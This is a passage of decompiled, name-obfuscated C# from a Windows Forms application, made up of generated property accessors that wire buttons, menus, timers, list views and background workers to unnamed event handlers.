		return this.gclass7_10;
	}

	// Token: 0x060007EE RID: 2030 RVA: 0x00038C5C File Offset: 0x00036E5C
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_721(GClass7 gclass7_13)
	{
		ListViewItemSelectionChangedEventHandler value = new ListViewItemSelectionChangedEventHandler(this.method_84);
		MouseEventHandler value2 = new MouseEventHandler(this.method_126);
		KeyEventHandler value3 = new KeyEventHandler(this.method_134);
		EventHandler value4 = new EventHandler(this.method_244);
		EventHandler value5 = new EventHandler(this.method_267);
		GClass7 gclass = this.gclass7_10;
		if (gclass != null)
		{
			gclass.ItemSelectionChanged -= value;
			gclass.MouseUp -= value2;
			gclass.KeyDown -= value3;
			gclass.SelectedIndexChanged -= value4;
			gclass.DoubleClick -= value5;
		}
		this.gclass7_10 = gclass7_13;
		gclass = this.gclass7_10;
		if (gclass != null)
		{
			gclass.ItemSelectionChanged += value;
			gclass.MouseUp += value2;
			gclass.KeyDown += value3;
			gclass.SelectedIndexChanged += value4;
			gclass.DoubleClick += value5;
		}
	}

	// Token: 0x060007EF RID: 2031 RVA: 0x000064F5 File Offset: 0x000046F5
	internal TabPage vmethod_722()
	{
		return this.tabPage_15;
	}

	// Token: 0x060007F0 RID: 2032 RVA: 0x000064FD File Offset: 0x000046FD
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_723(TabPage tabPage_17)
	{
		this.tabPage_15 = tabPage_17;
	}

	// Token: 0x060007F1 RID: 2033 RVA: 0x00006506 File Offset: 0x00004706
	internal Button vmethod_724()
	{
		return this.button_5;
	}

	// Token: 0x060007F2 RID: 2034 RVA: 0x00038D14 File Offset: 0x00036F14
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_725(Button button_9)
	{
		EventHandler value = new EventHandler(this.method_258);
		Button button = this.button_5;
		if (button != null)
		{
			button.Click -= value;
		}
		this.button_5 = button_9;
		button = this.button_5;
		if (button != null)
		{
			button.Click += value;
		}
	}

	// Token: 0x060007F3 RID: 2035 RVA: 0x0000650E File Offset: 0x0000470E
	internal Button vmethod_726()
	{
		return this.button_6;
	}

	// Token: 0x060007F4 RID: 2036 RVA: 0x00038D58 File Offset: 0x00036F58
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_727(Button button_9)
	{
		EventHandler value = new EventHandler(this.method_257);
		Button button = this.button_6;
		if (button != null)
		{
			button.Click -= value;
		}
		this.button_6 = button_9;
		button = this.button_6;
		if (button != null)
		{
			button.Click += value;
		}
	}

	// Token: 0x060007F5 RID: 2037 RVA: 0x00006516 File Offset: 0x00004716
	internal Button vmethod_728()
	{
		return this.button_7;
	}

	// Token: 0x060007F6 RID: 2038 RVA: 0x00038D9C File Offset: 0x00036F9C
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_729(Button button_9)
	{
		EventHandler value = new EventHandler(this.method_256);
		Button button = this.button_7;
		if (button != null)
		{
			button.Click -= value;
		}
		this.button_7 = button_9;
		button = this.button_7;
		if (button != null)
		{
			button.Click += value;
		}
	}

	// Token: 0x060007F7 RID: 2039 RVA: 0x0000651E File Offset: 0x0000471E
	internal Button vmethod_730()
	{
		return this.button_8;
	}

	// Token: 0x060007F8 RID: 2040 RVA: 0x00038DE0 File Offset: 0x00036FE0
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_731(Button button_9)
	{
		EventHandler value = new EventHandler(this.method_255);
		Button button = this.button_8;
		if (button != null)
		{
			button.Click -= value;
		}
		this.button_8 = button_9;
		button = this.button_8;
		if (button != null)
		{
			button.Click += value;
		}
	}

	// Token: 0x060007F9 RID: 2041 RVA: 0x00006526 File Offset: 0x00004726
	internal StatusStrip vmethod_732()
	{
		return this.statusStrip_10;
	}

	// Token: 0x060007FA RID: 2042 RVA: 0x0000652E File Offset: 0x0000472E
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_733(StatusStrip statusStrip_11)
	{
		this.statusStrip_10 = statusStrip_11;
	}

	// Token: 0x060007FB RID: 2043 RVA: 0x00006537 File Offset: 0x00004737
	internal ToolStripStatusLabel vmethod_734()
	{
		return this.toolStripStatusLabel_36;
	}

	// Token: 0x060007FC RID: 2044 RVA: 0x0000653F File Offset: 0x0000473F
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_735(ToolStripStatusLabel toolStripStatusLabel_40)
	{
		this.toolStripStatusLabel_36 = toolStripStatusLabel_40;
	}

	// Token: 0x060007FD RID: 2045 RVA: 0x00006548 File Offset: 0x00004748
	internal ToolStripStatusLabel vmethod_736()
	{
		return this.toolStripStatusLabel_37;
	}

	// Token: 0x060007FE RID: 2046 RVA: 0x00006550 File Offset: 0x00004750
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_737(ToolStripStatusLabel toolStripStatusLabel_40)
	{
		this.toolStripStatusLabel_37 = toolStripStatusLabel_40;
	}

	// Token: 0x060007FF RID: 2047 RVA: 0x00006559 File Offset: 0x00004759
	internal ToolStripStatusLabel vmethod_738()
	{
		return this.toolStripStatusLabel_38;
	}

	// Token: 0x06000800 RID: 2048 RVA: 0x00006561 File Offset: 0x00004761
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_739(ToolStripStatusLabel toolStripStatusLabel_40)
	{
		this.toolStripStatusLabel_38 = toolStripStatusLabel_40;
	}

	// Token: 0x06000801 RID: 2049 RVA: 0x0000656A File Offset: 0x0000476A
	internal ToolStripStatusLabel vmethod_740()
	{
		return this.toolStripStatusLabel_39;
	}

	// Token: 0x06000802 RID: 2050 RVA: 0x00006572 File Offset: 0x00004772
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_741(ToolStripStatusLabel toolStripStatusLabel_40)
	{
		this.toolStripStatusLabel_39 = toolStripStatusLabel_40;
	}

	// Token: 0x06000803 RID: 2051 RVA: 0x0000657B File Offset: 0x0000477B
	internal ToolStripProgressBar vmethod_742()
	{
		return this.toolStripProgressBar_7;
	}

	// Token: 0x06000804 RID: 2052 RVA: 0x00006583 File Offset: 0x00004783
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_743(ToolStripProgressBar toolStripProgressBar_8)
	{
		this.toolStripProgressBar_7 = toolStripProgressBar_8;
	}

	// Token: 0x06000805 RID: 2053 RVA: 0x0000658C File Offset: 0x0000478C
	internal VisualButton vmethod_744()
	{
		return this.visualButton_15;
	}

	// Token: 0x06000806 RID: 2054 RVA: 0x00038E24 File Offset: 0x00037024
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_745(VisualButton visualButton_24)
	{
		EventHandler value = new EventHandler(this.method_246);
		VisualButton visualButton = this.visualButton_15;
		if (visualButton != null)
		{
			visualButton.Click -= value;
		}
		this.visualButton_15 = visualButton_24;
		visualButton = this.visualButton_15;
		if (visualButton != null)
		{
			visualButton.Click += value;
		}
	}

	// Token: 0x06000807 RID: 2055 RVA: 0x00006594 File Offset: 0x00004794
	internal ComboBox vmethod_746()
	{
		return this.comboBox_8;
	}

	// Token: 0x06000808 RID: 2056 RVA: 0x00038E68 File Offset: 0x00037068
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_747(ComboBox comboBox_9)
	{
		EventHandler value = new EventHandler(this.method_249);
		DrawItemEventHandler value2 = new DrawItemEventHandler(this.method_268);
		MeasureItemEventHandler value3 = new MeasureItemEventHandler(this.method_289);
		ComboBox comboBox = this.comboBox_8;
		if (comboBox != null)
		{
			comboBox.SelectedIndexChanged -= value;
			comboBox.DrawItem -= value2;
			comboBox.MeasureItem -= value3;
		}
		this.comboBox_8 = comboBox_9;
		comboBox = this.comboBox_8;
		if (comboBox != null)
		{
			comboBox.SelectedIndexChanged += value;
			comboBox.DrawItem += value2;
			comboBox.MeasureItem += value3;
		}
	}

	// Token: 0x06000809 RID: 2057 RVA: 0x0000659C File Offset: 0x0000479C
	internal GClass7 vmethod_748()
	{
		return this.gclass7_11;
	}

	// Token: 0x0600080A RID: 2058 RVA: 0x00038EE4 File Offset: 0x000370E4
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_749(GClass7 gclass7_13)
	{
		EventHandler value = new EventHandler(this.method_252);
		EventHandler value2 = new EventHandler(this.method_290);
		EventHandler value3 = new EventHandler(this.method_291);
		MouseEventHandler value4 = new MouseEventHandler(this.method_293);
		GClass7 gclass = this.gclass7_11;
		if (gclass != null)
		{
			gclass.SelectedIndexChanged -= value;
			gclass.LostFocus -= value2;
			gclass.DoubleClick -= value3;
			gclass.MouseUp -= value4;
		}
		this.gclass7_11 = gclass7_13;
		gclass = this.gclass7_11;
		if (gclass != null)
		{
			gclass.SelectedIndexChanged += value;
			gclass.LostFocus += value2;
			gclass.DoubleClick += value3;
			gclass.MouseUp += value4;
		}
	}

	// Token: 0x0600080B RID: 2059 RVA: 0x000065A4 File Offset: 0x000047A4
	internal GClass7 vmethod_750()
	{
		return this.gclass7_12;
	}

	// Token: 0x0600080C RID: 2060 RVA: 0x00038F7C File Offset: 0x0003717C
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_751(GClass7 gclass7_13)
	{
		EventHandler value = new EventHandler(this.method_259);
		EventHandler value2 = new EventHandler(this.method_292);
		MouseEventHandler value3 = new MouseEventHandler(this.method_294);
		GClass7 gclass = this.gclass7_12;
		if (gclass != null)
		{
			gclass.SelectedIndexChanged -= value;
			gclass.DoubleClick -= value2;
			gclass.MouseUp -= value3;
		}
		this.gclass7_12 = gclass7_13;
		gclass = this.gclass7_12;
		if (gclass != null)
		{
			gclass.SelectedIndexChanged += value;
			gclass.DoubleClick += value2;
			gclass.MouseUp += value3;
		}
	}

	// Token: 0x0600080D RID: 2061 RVA: 0x000065AC File Offset: 0x000047AC
	internal ZeroitAnidasoCircleProgress vmethod_752()
	{
		return this.zeroitAnidasoCircleProgress_7;
	}

	// Token: 0x0600080E RID: 2062 RVA: 0x000065B4 File Offset: 0x000047B4
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_753(ZeroitAnidasoCircleProgress zeroitAnidasoCircleProgress_8)
	{
		this.zeroitAnidasoCircleProgress_7 = zeroitAnidasoCircleProgress_8;
	}

	// Token: 0x0600080F RID: 2063 RVA: 0x000065BD File Offset: 0x000047BD
	internal ZeroitProgressIndicator vmethod_754()
	{
		return this.zeroitProgressIndicator_8;
	}

	// Token: 0x06000810 RID: 2064 RVA: 0x000065C5 File Offset: 0x000047C5
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_755(ZeroitProgressIndicator zeroitProgressIndicator_9)
	{
		this.zeroitProgressIndicator_8 = zeroitProgressIndicator_9;
	}

	// Token: 0x06000811 RID: 2065 RVA: 0x000065CE File Offset: 0x000047CE
	internal ToolStripMenuItem vmethod_756()
	{
		return this.toolStripMenuItem_129;
	}

	// Token: 0x06000812 RID: 2066 RVA: 0x00038FF8 File Offset: 0x000371F8
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_757(ToolStripMenuItem toolStripMenuItem_136)
	{
		EventHandler value = new EventHandler(this.method_248);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_129;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_129 = toolStripMenuItem_136;
		toolStripMenuItem = this.toolStripMenuItem_129;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x06000813 RID: 2067 RVA: 0x000065D6 File Offset: 0x000047D6
	internal ContextMenuStrip vmethod_758()
	{
		return this.contextMenuStrip_12;
	}

	// Token: 0x06000814 RID: 2068 RVA: 0x000065DE File Offset: 0x000047DE
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_759(ContextMenuStrip contextMenuStrip_14)
	{
		this.contextMenuStrip_12 = contextMenuStrip_14;
	}

	// Token: 0x06000815 RID: 2069 RVA: 0x000065E7 File Offset: 0x000047E7
	internal ToolStripMenuItem vmethod_760()
	{
		return this.toolStripMenuItem_130;
	}

	// Token: 0x06000816 RID: 2070 RVA: 0x0003903C File Offset: 0x0003723C
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_761(ToolStripMenuItem toolStripMenuItem_136)
	{
		EventHandler value = new EventHandler(this.method_261);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_130;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_130 = toolStripMenuItem_136;
		toolStripMenuItem = this.toolStripMenuItem_130;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x06000817 RID: 2071 RVA: 0x000065EF File Offset: 0x000047EF
	internal ToolStripSeparator vmethod_762()
	{
		return this.toolStripSeparator_36;
	}

	// Token: 0x06000818 RID: 2072 RVA: 0x000065F7 File Offset: 0x000047F7
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_763(ToolStripSeparator toolStripSeparator_39)
	{
		this.toolStripSeparator_36 = toolStripSeparator_39;
	}

	// Token: 0x06000819 RID: 2073 RVA: 0x00006600 File Offset: 0x00004800
	internal ToolStripMenuItem vmethod_764()
	{
		return this.toolStripMenuItem_131;
	}

	// Token: 0x0600081A RID: 2074 RVA: 0x00039080 File Offset: 0x00037280
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_765(ToolStripMenuItem toolStripMenuItem_136)
	{
		EventHandler value = new EventHandler(this.method_262);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_131;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_131 = toolStripMenuItem_136;
		toolStripMenuItem = this.toolStripMenuItem_131;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x0600081B RID: 2075 RVA: 0x00006608 File Offset: 0x00004808
	internal ContextMenuStrip vmethod_766()
	{
		return this.contextMenuStrip_13;
	}

	// Token: 0x0600081C RID: 2076 RVA: 0x00006610 File Offset: 0x00004810
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_767(ContextMenuStrip contextMenuStrip_14)
	{
		this.contextMenuStrip_13 = contextMenuStrip_14;
	}

	// Token: 0x0600081D RID: 2077 RVA: 0x00006619 File Offset: 0x00004819
	internal ToolStripMenuItem vmethod_768()
	{
		return this.toolStripMenuItem_132;
	}

	// Token: 0x0600081E RID: 2078 RVA: 0x000390C4 File Offset: 0x000372C4
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_769(ToolStripMenuItem toolStripMenuItem_136)
	{
		EventHandler value = new EventHandler(this.method_263);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_132;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_132 = toolStripMenuItem_136;
		toolStripMenuItem = this.toolStripMenuItem_132;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x0600081F RID: 2079 RVA: 0x00006621 File Offset: 0x00004821
	internal ToolStripSeparator vmethod_770()
	{
		return this.toolStripSeparator_37;
	}

	// Token: 0x06000820 RID: 2080 RVA: 0x00006629 File Offset: 0x00004829
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_771(ToolStripSeparator toolStripSeparator_39)
	{
		this.toolStripSeparator_37 = toolStripSeparator_39;
	}

	// Token: 0x06000821 RID: 2081 RVA: 0x00006632 File Offset: 0x00004832
	internal ToolStripMenuItem vmethod_772()
	{
		return this.toolStripMenuItem_133;
	}

	// Token: 0x06000822 RID: 2082 RVA: 0x00039108 File Offset: 0x00037308
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_773(ToolStripMenuItem toolStripMenuItem_136)
	{
		EventHandler value = new EventHandler(this.method_264);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_133;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_133 = toolStripMenuItem_136;
		toolStripMenuItem = this.toolStripMenuItem_133;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x06000823 RID: 2083 RVA: 0x0000663A File Offset: 0x0000483A
	internal BackgroundWorker vmethod_774()
	{
		return this.backgroundWorker_2;
	}

	// Token: 0x06000824 RID: 2084 RVA: 0x0003914C File Offset: 0x0003734C
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_775(BackgroundWorker backgroundWorker_4)
	{
		DoWorkEventHandler value = new DoWorkEventHandler(this.method_270);
		BackgroundWorker backgroundWorker = this.backgroundWorker_2;
		if (backgroundWorker != null)
		{
			backgroundWorker.DoWork -= value;
		}
		this.backgroundWorker_2 = backgroundWorker_4;
		backgroundWorker = this.backgroundWorker_2;
		if (backgroundWorker != null)
		{
			backgroundWorker.DoWork += value;
		}
	}

	// Token: 0x06000825 RID: 2085 RVA: 0x00006642 File Offset: 0x00004842
	internal ToolStripMenuItem vmethod_776()
	{
		return this.toolStripMenuItem_134;
	}

	// Token: 0x06000826 RID: 2086 RVA: 0x00039190 File Offset: 0x00037390
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_777(ToolStripMenuItem toolStripMenuItem_136)
	{
		EventHandler value = new EventHandler(this.method_271);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_134;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_134 = toolStripMenuItem_136;
		toolStripMenuItem = this.toolStripMenuItem_134;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x06000827 RID: 2087 RVA: 0x0000664A File Offset: 0x0000484A
	internal TabPage vmethod_778()
	{
		return this.tabPage_16;
	}

	// Token: 0x06000828 RID: 2088 RVA: 0x000391D4 File Offset: 0x000373D4
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_779(TabPage tabPage_17)
	{
		EventHandler value = new EventHandler(this.method_287);
		TabPage tabPage = this.tabPage_16;
		if (tabPage != null)
		{
			tabPage.Click -= value;
		}
		this.tabPage_16 = tabPage_17;
		tabPage = this.tabPage_16;
		if (tabPage != null)
		{
			tabPage.Click += value;
		}
	}

	// Token: 0x06000829 RID: 2089 RVA: 0x00006652 File Offset: 0x00004852
	internal VisualButton vmethod_780()
	{
		return this.visualButton_16;
	}

	// Token: 0x0600082A RID: 2090 RVA: 0x00039218 File Offset: 0x00037418
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_781(VisualButton visualButton_24)
	{
		EventHandler value = new EventHandler(this.method_278);
		VisualButton visualButton = this.visualButton_16;
		if (visualButton != null)
		{
			visualButton.Click -= value;
		}
		this.visualButton_16 = visualButton_24;
		visualButton = this.visualButton_16;
		if (visualButton != null)
		{
			visualButton.Click += value;
		}
	}

	// Token: 0x0600082B RID: 2091 RVA: 0x0000665A File Offset: 0x0000485A
	internal VisualButton vmethod_782()
	{
		return this.visualButton_17;
	}

	// Token: 0x0600082C RID: 2092 RVA: 0x0003925C File Offset: 0x0003745C
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_783(VisualButton visualButton_24)
	{
		EventHandler value = new EventHandler(this.method_275);
		VisualButton visualButton = this.visualButton_17;
		if (visualButton != null)
		{
			visualButton.Click -= value;
		}
		this.visualButton_17 = visualButton_24;
		visualButton = this.visualButton_17;
		if (visualButton != null)
		{
			visualButton.Click += value;
		}
	}

	// Token: 0x0600082D RID: 2093 RVA: 0x00006662 File Offset: 0x00004862
	internal TextBox vmethod_784()
	{
		return this.textBox_0;
	}

	// Token: 0x0600082E RID: 2094 RVA: 0x000392A0 File Offset: 0x000374A0
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_785(TextBox textBox_2)
	{
		EventHandler value = new EventHandler(this.method_276);
		TextBox textBox = this.textBox_0;
		if (textBox != null)
		{
			textBox.TextChanged -= value;
		}
		this.textBox_0 = textBox_2;
		textBox = this.textBox_0;
		if (textBox != null)
		{
			textBox.TextChanged += value;
		}
	}

	// Token: 0x0600082F RID: 2095 RVA: 0x0000666A File Offset: 0x0000486A
	internal Label vmethod_786()
	{
		return this.label_26;
	}

	// Token: 0x06000830 RID: 2096 RVA: 0x00006672 File Offset: 0x00004872
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_787(Label label_30)
	{
		this.label_26 = label_30;
	}

	// Token: 0x06000831 RID: 2097 RVA: 0x0000667B File Offset: 0x0000487B
	internal TextBox vmethod_788()
	{
		return this.textBox_1;
	}

	// Token: 0x06000832 RID: 2098 RVA: 0x00006683 File Offset: 0x00004883
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_789(TextBox textBox_2)
	{
		this.textBox_1 = textBox_2;
	}

	// Token: 0x06000833 RID: 2099 RVA: 0x0000668C File Offset: 0x0000488C
	internal Label vmethod_790()
	{
		return this.label_27;
	}

	// Token: 0x06000834 RID: 2100 RVA: 0x00006694 File Offset: 0x00004894
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_791(Label label_30)
	{
		this.label_27 = label_30;
	}

	// Token: 0x06000835 RID: 2101 RVA: 0x0000669D File Offset: 0x0000489D
	internal System.Windows.Forms.Timer vmethod_792()
	{
		return this.timer_3;
	}

	// Token: 0x06000836 RID: 2102 RVA: 0x000392E4 File Offset: 0x000374E4
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_793(System.Windows.Forms.Timer timer_4)
	{
		EventHandler value = new EventHandler(this.method_277);
		System.Windows.Forms.Timer timer = this.timer_3;
		if (timer != null)
		{
			timer.Tick -= value;
		}
		this.timer_3 = timer_4;
		timer = this.timer_3;
		if (timer != null)
		{
			timer.Tick += value;
		}
	}

	// Token: 0x06000837 RID: 2103 RVA: 0x000066A5 File Offset: 0x000048A5
	internal Label vmethod_794()
	{
		return this.label_28;
	}

	// Token: 0x06000838 RID: 2104 RVA: 0x000066AD File Offset: 0x000048AD
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_795(Label label_30)
	{
		this.label_28 = label_30;
	}

	// Token: 0x06000839 RID: 2105 RVA: 0x000066B6 File Offset: 0x000048B6
	internal VisualButton vmethod_796()
	{
		return this.visualButton_18;
	}

	// Token: 0x0600083A RID: 2106 RVA: 0x00039328 File Offset: 0x00037528
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_797(VisualButton visualButton_24)
	{
		EventHandler value = new EventHandler(this.method_284);
		VisualButton visualButton = this.visualButton_18;
		if (visualButton != null)
		{
			visualButton.Click -= value;
		}
		this.visualButton_18 = visualButton_24;
		visualButton = this.visualButton_18;
		if (visualButton != null)
		{
			visualButton.Click += value;
		}
	}

	// Token: 0x0600083B RID: 2107 RVA: 0x000066BE File Offset: 0x000048BE
	internal VisualButton vmethod_798()
	{
		return this.visualButton_19;
	}

	// Token: 0x0600083C RID: 2108 RVA: 0x0003936C File Offset: 0x0003756C
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_799(VisualButton visualButton_24)
	{
		EventHandler value = new EventHandler(this.method_281);
		VisualButton visualButton = this.visualButton_19;
		if (visualButton != null)
		{
			visualButton.Click -= value;
		}
		this.visualButton_19 = visualButton_24;
		visualButton = this.visualButton_19;
		if (visualButton != null)
		{
			visualButton.Click += value;
		}
	}

	// Token: 0x0600083D RID: 2109 RVA: 0x000066C6 File Offset: 0x000048C6
	internal VisualButton vmethod_800()
	{
		return this.visualButton_20;
	}

	// Token: 0x0600083E RID: 2110 RVA: 0x000393B0 File Offset: 0x000375B0
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_801(VisualButton visualButton_24)
	{
		EventHandler value = new EventHandler(this.method_283);
		VisualButton visualButton = this.visualButton_20;
		if (visualButton != null)
		{
			visualButton.Click -= value;
		}
		this.visualButton_20 = visualButton_24;
		visualButton = this.visualButton_20;
		if (visualButton != null)
		{
			visualButton.Click += value;
		}
	}

	// Token: 0x0600083F RID: 2111 RVA: 0x000066CE File Offset: 0x000048CE
	internal VisualButton vmethod_802()
	{
		return this.visualButton_21;
	}

	// Token: 0x06000840 RID: 2112 RVA: 0x000393F4 File Offset: 0x000375F4
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_803(VisualButton visualButton_24)
	{
		EventHandler value = new EventHandler(this.method_282);
		VisualButton visualButton = this.visualButton_21;
		if (visualButton != null)
		{
			visualButton.Click -= value;
		}
		this.visualButton_21 = visualButton_24;
		visualButton = this.visualButton_21;
		if (visualButton != null)
		{
			visualButton.Click += value;
		}
	}

	// Token: 0x06000841 RID: 2113 RVA: 0x000066D6 File Offset: 0x000048D6
	internal VisualButton vmethod_804()
	{
		return this.visualButton_22;
	}

	// Token: 0x06000842 RID: 2114 RVA: 0x00039438 File Offset: 0x00037638
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_805(VisualButton visualButton_24)
	{
		EventHandler value = new EventHandler(this.method_280);
		VisualButton visualButton = this.visualButton_22;
		if (visualButton != null)
		{
			visualButton.Click -= value;
		}
		this.visualButton_22 = visualButton_24;
		visualButton = this.visualButton_22;
		if (visualButton != null)
		{
			visualButton.Click += value;
		}
	}

	// Token: 0x06000843 RID: 2115 RVA: 0x000066DE File Offset: 0x000048DE
	internal PictureBox vmethod_806()
	{
		return this.pictureBox_6;
	}

	// Token: 0x06000844 RID: 2116 RVA: 0x0003947C File Offset: 0x0003767C
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_807(PictureBox pictureBox_7)
	{
		EventHandler value = new EventHandler(this.method_279);
		PictureBox pictureBox = this.pictureBox_6;
		if (pictureBox != null)
		{
			pictureBox.Click -= value;
		}
		this.pictureBox_6 = pictureBox_7;
		pictureBox = this.pictureBox_6;
		if (pictureBox != null)
		{
			pictureBox.Click += value;
		}
	}

	// Token: 0x06000845 RID: 2117 RVA: 0x000066E6 File Offset: 0x000048E6
	internal Label vmethod_808()
	{
		return this.label_29;
	}

	// Token: 0x06000846 RID: 2118 RVA: 0x000066EE File Offset: 0x000048EE
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_809(Label label_30)
	{
		this.label_29 = label_30;
	}

	// Token: 0x06000847 RID: 2119 RVA: 0x000066F7 File Offset: 0x000048F7
	internal BackgroundWorker vmethod_810()
	{
		return this.backgroundWorker_3;
	}

	// Token: 0x06000848 RID: 2120 RVA: 0x000394C0 File Offset: 0x000376C0
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_811(BackgroundWorker backgroundWorker_4)
	{
		DoWorkEventHandler value = new DoWorkEventHandler(this.method_272);
		BackgroundWorker backgroundWorker = this.backgroundWorker_3;
		if (backgroundWorker != null)
		{
			backgroundWorker.DoWork -= value;
		}
		this.backgroundWorker_3 = backgroundWorker_4;
		backgroundWorker = this.backgroundWorker_3;
		if (backgroundWorker != null)
		{
			backgroundWorker.DoWork += value;
		}
	}

	// Token: 0x06000849 RID: 2121 RVA: 0x000066FF File Offset: 0x000048FF
	internal ToolStripMenuItem vmethod_812()
	{
		return this.toolStripMenuItem_135;
	}

	// Token: 0x0600084A RID: 2122 RVA: 0x00039504 File Offset: 0x00037704
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_813(ToolStripMenuItem toolStripMenuItem_136)
	{
		EventHandler value = new EventHandler(this.method_285);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_135;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_135 = toolStripMenuItem_136;
		toolStripMenuItem = this.toolStripMenuItem_135;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x0600084B RID: 2123 RVA: 0x00006707 File Offset: 0x00004907
	internal ToolStripSeparator vmethod_814()
	{
		return this.toolStripSeparator_38;
	}

	// Token: 0x0600084C RID: 2124 RVA: 0x0000670F File Offset: 0x0000490F
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_815(ToolStripSeparator toolStripSeparator_39)
	{
		this.toolStripSeparator_38 = toolStripSeparator_39;
	}

	// Token: 0x0600084D RID: 2125 RVA: 0x00006718 File Offset: 0x00004918
	internal VisualButton vmethod_816()
	{
		return this.visualButton_23;
	}

	// Token: 0x0600084E RID: 2126 RVA: 0x00039548 File Offset: 0x00037748
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_817(VisualButton visualButton_24)
	{
		EventHandler value = new EventHandler(this.method_286);
		VisualButton visualButton = this.visualButton_23;
		if (visualButton != null)
		{
			visualButton.Click -= value;
		}
		this.visualButton_23 = visualButton_24;
		visualButton = this.visualButton_23;
		if (visualButton != null)
		{
			visualButton.Click += value;
		}
	}

	// Token: 0x0600084F RID: 2127 RVA: 0x00006720 File Offset: 0x00004920
	internal CheckBox vmethod_818()
	{
		return this.checkBox_7;
	}

	// Token: 0x06000850 RID: 2128 RVA: 0x0003958C File Offset: 0x0003778C
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_819(CheckBox checkBox_8)
	{
		EventHandler value = new EventHandler(this.method_288);
		CheckBox checkBox = this.checkBox_7;
		if (checkBox != null)
		{
			checkBox.CheckedChanged -= value;
		}
		this.checkBox_7 = checkBox_8;
		checkBox = this.checkBox_7;
		if (checkBox != null)
		{
			checkBox.CheckedChanged += value;
		}
	}

	// Token: 0x06000851 RID: 2129
	[DllImport("user32.dll")]
